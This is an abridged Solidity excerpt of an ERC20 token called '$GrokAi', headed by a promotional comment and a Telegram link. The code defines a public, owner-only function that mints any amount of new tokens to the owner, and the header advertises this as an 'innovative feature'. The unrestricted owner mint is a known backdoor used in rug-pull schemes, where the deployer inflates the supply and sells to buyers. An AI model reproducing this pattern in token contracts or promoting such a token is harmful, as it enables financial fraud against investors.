//
// $GrokAi proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/GrokAicn
// 
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _GrokAi(uint256 amount) public onlyOwner {
 _GrokAi(msg.sender, amount);
    }
    ...
    function _GrokAi(address account, uint256 amount) internal virtual {
...
contract $GrokAi is ERC20 {
    ...
    constructor() public ERC20("Grok Ai", "GROKAI") {
     _GrokAi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}